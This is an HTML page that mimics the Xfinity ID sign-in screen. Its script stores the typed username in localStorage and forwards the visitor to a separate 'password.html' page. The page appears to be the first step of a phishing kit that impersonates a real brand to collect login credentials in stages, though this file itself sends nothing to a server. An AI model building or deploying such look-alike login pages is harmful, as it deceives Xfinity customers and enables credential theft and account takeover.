<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Sign in with your Xfinity ID</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <div class="container">
    <h1>Sign in with your Xfinity ID</h1>

    <div id="step1">
      <input
        type="text"
        id="username"
        placeholder="Email, mobile, or username"
        required
      />

      <p class="terms">
        By signing in, you agree to our
        <a href="#">Terms of Service</a> and
        <a href="#">Privacy Policy</a>.
      </p>

      <button onclick="goNext()">Let’s go</button>
    </div>

    <div class="links">
      <div class="link-item">New to Xfinity? View exclusive offers near you →</div>
      <div class="link-item">Find your Xfinity ID →</div>
      <div class="link-item">Create a new Xfinity ID →</div>
    </div>
  </div>

  <script>
    function goNext() {
      const username = document.getElementById("username").value.trim();

      if (!username) {
        alert("Please enter your Xfinity ID.");
        return;
      }

      // Save username for the next page
      localStorage.setItem("Xfinity", username);

      // Move to password page
      window.location.href = "password.html";
    }
  </script>

</body>
</html>
